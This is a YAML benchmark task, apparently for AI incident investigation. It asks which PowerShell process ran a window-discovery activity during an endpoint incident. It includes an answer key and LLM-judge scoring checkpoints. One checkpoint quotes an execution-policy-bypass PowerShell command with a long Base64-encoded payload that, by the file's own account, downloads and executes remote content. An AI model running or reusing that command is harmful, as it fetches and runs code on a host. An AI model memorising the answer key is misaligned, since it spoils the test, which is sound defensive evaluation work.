@@ -1,0 +1,43 @@
+tasks:
+- task_id: incident_38_latest_cleaned_test_set_task_12
+  title: incident_38_latest_cleaned_test_set_task_12
+  description: 'Just moments before the injection alert, the same device generated a ''Suspicious Application Window Discovery'' alert. Which process (name and process ID) executed that discovery activity, and what notable command-line options were used?'
+  inherit_shared: true
+  initial_context:
+    incident_context: 'During a multi-stage incident on an endpoint, a ''Suspicious process injection observed'' alert fired at 2024-07-04 22:35:00 UTC. The injection involved the process `notepad.exe` (Process ID 8932, created 2024-06-26T15:49:51.3043595Z) and was associated with the URL `https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/winatp-intro-fileless.txt`, suggesting unexpected code was running inside a trusted process and possibly communicating externally.'
+    question: 'Just moments before the injection alert, the same device generated a ''Suspicious Application Window Discovery'' alert. Which process (name and process ID) executed that discovery activity, and what notable command-line options were used?'
+    # Main task submission evaluation - uses LLM-as-a-judge by default
+    # To use static matching instead, change strategy to "static" and set:
+    #   criteria:
+    #     expected_answers:
+    #       - 'The discovery activity was executed by `powershell.exe` with Process ID 4656 (created 2024-06-26T15:49:41.4025245Z). It ran with `-executionpolicy bypass -encodedcommand <base64 blob>` along with `-inputformat xml -outputformat text`, i.e., a Base64-encoded PowerShell command run with execution policy bypass.'
+  scoring:
+    llm_judge:
+      model: "{judge_llm}"
+      steps_per_message: 50
+      judge_system_template: judge/checkpoint_judge_system.md
+      judge_user_template: judge/checkpoint_judge_user.md
+      submission:
+        target: submission
+        judge_system_template: judge/submission_judge_system.md
+        judge_user_template: judge/submission_judge_user.md
+        description: 'The discovery activity was executed by `powershell.exe` with Process ID 4656 (created 2024-06-26T15:49:41.4025245Z). It ran with `-executionpolicy bypass -encodedcommand <base64 blob>` along with `-inputformat xml -outputformat text`, i.e., a Base64-encoded PowerShell command run with execution policy bypass.'
+        max_score: 1.0
+      checkpoint_1:
+        target: trajectory
+        max_score: 0.5
+        weight: 1.0
+        title: Checkpoint 1
+        description: 'A suspicious process injection was observed, where code was injected into another process which then communicated with the external IP address `72.5.72.208`, indicating possible command-and-control activity.'
+      checkpoint_2:
+        target: trajectory
+        max_score: 0.5
+        weight: 1.0
+        title: Checkpoint 2
+        description: 'Following the injection, a suspicious application window discovery technique was executed on the device: a PowerShell process with Process ID `4656`, created at `2024-06-26t15:49:41.4025245z`, ran the command line `"powershell.exe" -executionpolicy bypass -encodedcommand wwboaguadaauafmazqbyahyaaqbjaguauabvagkabgb0ae0ayqbuageazwblahiaxqa6adoauwblagmadqbyagkadab5afaacgbvahqabwbjag8abaagad0aiabbae4azqb0ac4auwblagmadqbyagkadab5afaacgbvahqabwbjag8ababuahkacablaf0aoga6afqababzadeamga7acqaeabvahiaiaa9acaawwbtahkacwb0aguabqauafqazqb4ahqalgbfag4aywbvagqaaqbuagcaxqa6adoavqbuaeyaoaauaecazqb0aeiaeqb0aguacwaoaccavwbpag4aqqbuafaalqbjag4adabyag8alqbjag4aagblagmadabpag8abganackaowakagiayqbzaguanga0afmadabyagkabgbnacaapqagacgasqbuahyabwbragualqbxaguaygbsaguacqb1aguacwb0acaalqbvafiasqagaggadab0ahaacwa6ac8alwb3agmazabzahqayqb0agkaywbmagkabablahmacabyagqazqb1ahmalgbiagwabwbiac4aywbvahiazqauahcaaqbuagqabwb3ahmalgbuaguadaavahcaywbkahmadabhahqaaqbjagyaaqbsaguacwavafcaaqbuaeeavabqac0asqbuahqacgbvac0argbpagwazqbsaguacwbzac4adab4ahqaiaatafuacwblaeiayqbzagkaywbqageacgbzagkabgbnackalgbdag8abgb0aguabgb0adsavabyahkaewagacqaywbvag4adablag4adabcahkadablahmaiaa9acaawwbtahkacwb0aguabqauaemabwbuahyazqbyahqaxqa6adoargbyag8abqbcageacwbladyanabtahqacgbpag4azwaoacqaygbhahmazqa2adqauwb0ahiaaqbuagcakqagah0aiabdageadabjaggaiab7acaajabjag8abgb0aguabgb0aeiaeqb0aguacwagad0aiabbafmaeqbzahqazqbtac4aqwbvag4adgblahiadabdadoaogbgahiabwbtaeiayqbzaguanga0afmadabyagkabgbnacgajabiageacwbladyanabtahqacgbpag4azwauafmadqbiahmadabyagkabgbnacgamwapackaiab9adsajabpacaapqagadaaowagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaapqagaeaakaapadsajabjag8abgb0aguabgb0aeiaeqb0aguacwauagyabwbyaguayqbjaggaewagacqazablagmacgb5ahaadablagqaqgb5ahqazqbzacaakwa9acaajabfacaalqbiahgabwbyacaajab4ag8acgbbacqaaqbdadsaiaakagkakwaradsaiabpagyaiaaoacqaaqagac0azqbxacaajab4ag8acgauaewazqbuagcadaboackaiab7acqaaqagad0aiaawah0aiab9adsasqbuahyabwbragualqbfahgacabyaguacwbzagkabwbuacaakabbafmaeqbzahqazqbtac4avablahgadaauaeuabgbjag8azabpag4azwbdadoaogbvafqarga4ac4arwblahqauwb0ahiaaqbuagcakaakagqazqbjahiaeqbwahqazqbkaeiaeqb0aguacwapacka -inputformat xml -outputformat text`, using an execution-policy bypass and a Base64-encoded command to download and execute remote content while enumerating application windows on the device.'
+  scoring_aggregation:
+    max:
+      scores:
+      - submission
+      - - checkpoint_1
+        - checkpoint_2
